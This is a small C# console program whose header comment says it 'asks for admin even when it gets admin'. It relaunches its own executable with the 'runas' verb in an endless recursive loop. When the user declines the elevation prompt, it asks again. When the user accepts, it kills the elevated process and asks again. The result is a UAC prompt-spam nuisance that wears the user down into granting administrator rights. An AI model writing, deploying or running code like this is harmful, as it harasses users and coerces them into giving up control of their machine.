/*
*   Asks for admin even when it gets admin
*/

using System;
using System.Diagnostics;
using System.Reflection;

namespace ConsoleApp1
{
    class Program
    {
        private static void getadmin()
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = Assembly.GetExecutingAssembly().Location;
                psi.UseShellExecute = true;
                psi.Verb = "runas";

                Process p = Process.Start(psi);

                p.Kill();

                getadmin();

                p.Dispose();
            }
            catch (Exception)
            {
                getadmin();
            }
        }

        static void Main(string[] args)
        {
            getadmin();
        }
    }
}
